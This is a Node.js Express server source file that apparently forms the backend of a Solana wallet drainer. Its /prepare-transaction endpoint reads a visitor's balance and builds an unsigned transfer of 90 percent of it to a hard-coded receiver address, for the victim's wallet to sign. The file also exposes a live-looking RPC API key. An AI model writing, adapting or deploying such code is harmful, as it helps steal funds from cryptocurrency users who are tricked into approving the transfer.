const express = require('express');
const { Connection, PublicKey, Transaction, SystemProgram, LAMPORTS_PER_SOL } = require('@solana/web3.js');

const app = express();
app.use(express.json());
app.use(express.static('public'));

// CONFIG
const HELIUS_RPC = 'https://mainnet.helius-rpc.com/?api-key=58027310-7551-4e1a-92b0-2bf2c05d238b';
const RECEIVER = 'BxhvDsAy2d1DWbUwjFkps1R57H27Mey4RK3qQqoB1mFJ';
const connection = new Connection(HELIUS_RPC);

console.log('Server starting...');

// SIMPLE BALANCE
app.post('/api/getBalance', async (req, res) => {
    try {
        const pk = new PublicKey(req.body.publicKey);
        const balance = await connection.getBalance(pk);
        res.json({ success: true, balance });
    } catch(e) {
        res.status(500).json({ error: e.message });
    }
});

// SIMPLE BLOCKHASH
app.post('/api/getBlockhash', async (req, res) => {
    try {
        const bh = await connection.getLatestBlockhash();
        res.json({ success: true, blockhash: bh.blockhash, lastValidBlockHeight: bh.lastValidBlockHeight });
    } catch(e) {
        res.status(500).json({ error: e.message });
    }
});

// SIMPLE SEND
app.post('/api/sendTransaction', async (req, res) => {
    try {
        const txBuffer = Buffer.from(req.body.transaction, 'base64');
        const sig = await connection.sendRawTransaction(txBuffer);
        res.json({ success: true, txid: sig });
    } catch(e) {
        res.status(500).json({ error: e.message });
    }
});

// THE MAIN ONE - SIMPLE PREPARE (NO BLOCKHASH, NO SIGNATURES)
app.post('/prepare-transaction', async (req, res) => {
    console.log('Prepare called');
    
    try {
        const { publicKey } = req.body;
        
        // Parse keys
        const from = new PublicKey(publicKey);
        const to = new PublicKey(RECEIVER);
        
        // Get balance
        const balance = await connection.getBalance(from);
        console.log('Balance:', balance / 1e9, 'SOL');
        
        // Check minimum
        if (balance < 20000000) {
            return res.json({ success: false, error: 'Need 0.02 SOL' });
        }
        
        // Send 90%
        const amount = Math.floor(balance * 0.9);
        
        // Create transaction
        const tx = new Transaction();
        tx.add(SystemProgram.transfer({
            fromPubkey: from,
            toPubkey: to,
            lamports: amount
        }));
        
        // Serialize WITHOUT blockhash and WITHOUT signatures
        const serialized = tx.serialize({
            requireAllSignatures: false,
            verifySignatures: false
        });
        
        console.log('Transaction ready, size:', serialized.length);
        
        res.json({
            success: true,
            transaction: Array.from(serialized),
            amountSol: (amount / 1e9).toFixed(6)
        });
        
    } catch(e) {
        console.error('Error:', e.message);
        res.status(500).json({ success: false, error: e.message });
    }
});

// Notification
app.post('/notify', (req, res) => {
    console.log('Notify:', req.body.customMessage);
    res.json({ ok: true });
});

// Health check
app.get('/health', (req, res) => {
    res.json({ status: 'ok' });
});

// Start
const PORT = process.env.PORT || 5000;
app.listen(PORT, '0.0.0.0', () => {
    console.log(`Server on port ${PORT}`);
    console.log(`Receiver: ${RECEIVER}`);
});
